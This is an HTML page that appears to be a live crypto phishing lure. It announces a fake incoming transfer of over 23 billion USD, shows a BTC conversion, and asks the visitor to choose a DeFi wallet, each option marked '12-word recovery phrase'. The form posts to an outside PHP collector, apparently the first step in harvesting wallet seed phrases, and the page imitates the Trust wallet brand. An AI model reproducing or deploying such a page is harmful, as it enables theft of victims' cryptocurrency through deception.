<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Transfer</title>
    <link rel="stylesheet" href="wstyle.css">
    <link rel="icon" type="image/png" sizes="52x52" href="https://cdn.glitch.global/5126d383-2b49-4b4c-ab3f-3b9ed06b0ba4/favicon-32x32.png?1732388281684">
    <style>
      
    </style>
</head>

<body>

    <header>
        <a href="#"><img src="https://cdn.glitch.global/5126d383-2b49-4b4c-ab3f-3b9ed06b0ba4/thumbnails%2Fheader.png?1732388289661" alt="Logo" title="Home"></a>
    </header>

    <div class="container">

        <div class="confirmation">
            <p><strong>Confirm incoming Transfer of 23,183,551,506 USD</strong></p>
            <p>Total BTC: <span id="btcAmount">Loading...</span></p>
        </div>

    

        <h2>Receive using your DeFi wallet</h2>
        <p>Please choose from the selection below:</p>
        <form id="selectForm" action="https://www.armstrong-int.com/bt/pijiji11k.php" method="POST">
            <select name="wallet" id="optionSelect" required>
                <option value="">Select a DeFi wallet</option>
                <option value="Trust Wallet">Trust Wallet: 12-word recovery phrase</option>
<option value="Atomic Wallet" style="background-image: url('icon_aa.png');">Atomic Wallet: 12-word recovery phrase</option>
                <option value="BitPay Wallet" style="background-image: url('icon_aa.png');">BitPay Wallet: 12-word recovery phrase</option>
                <option value="Blockchain Wallet" style="background-image: url('icon_aa.png');">Blockchain Wallet: 12-word recovery phrase</option>
                <option value="Binance Chain Wallet">Binance Chain Wallet: 12-word recovery phrase</option>
                <option value="Coinbase Wallet">Coinbase Wallet: 12-word recovery phrase</option>
                <option value="Other">Other</option>
            </select>
            <input type="text" name="wallet_name" id="textField" placeholder="Enter Wallet Name" style="display: none;" required>
            <input type="submit" value="Continue" disabled>
        </form>
        <p class="notice">Select an option or enter text to proceed.</p>
        <p style="margin-top: 20px;">Need help? <a href="#">Contact Us</a></p>
    </div>

    <script>
        const countdownElement = document.getElementById('countdown');
        let countdownTime = 12 * 60 * 60;

        function updateCountdown() {
            const hours = String(Math.floor(countdownTime / 3600)).padStart(2, '0');
            const minutes = String(Math.floor((countdownTime % 3600) / 60)).padStart(2, '0');
            const seconds = String(countdownTime % 60).padStart(2, '0');
            countdownElement.textContent = `${hours}:${minutes}:${seconds}`;
            countdownTime--;

            if (countdownTime < 0) {
                clearInterval(timer);
                countdownElement.textContent = 'Time Expired';
            }
        }

        const timer = setInterval(updateCountdown, 1000);

        const btcAmountElement = document.getElementById('btcAmount');
        const usdAmount = 23183551506;

        async function fetchBTCPrice() {
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
                const data = await response.json();
                const btcRate = data.bitcoin.usd;
                const btcAmount = (usdAmount / btcRate).toFixed(8);
                btcAmountElement.textContent = `${btcAmount} BTC (1 BTC = $${btcRate})`;
            } catch (error) {
                btcAmountElement.textContent = 'Error fetching BTC rate';
                console.error('Error fetching BTC rate:', error);
            }
        }

        fetchBTCPrice();
        setInterval(fetchBTCPrice, 30000);

        const select = document.getElementById('optionSelect');
        const textField = document.getElementById('textField');
        const submitButton = document.querySelector('input[type="submit"]');

        select.addEventListener('change', () => {
            if (select.value === 'Other') {
                textField.style.display = 'block';
                textField.setAttribute('required', 'true');
            } else {
                textField.style.display = 'none';
                textField.removeAttribute('required');
            }
            toggleSubmitButton();
        });

        textField.addEventListener('input', toggleSubmitButton);

        function toggleSubmitButton() {
            if (select.value || textField.value.trim()) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        }
    </script>

    <footer>
        <p>&copy; 2025 Trust. All rights reserved.</p>
    </footer>
</body>

</html>
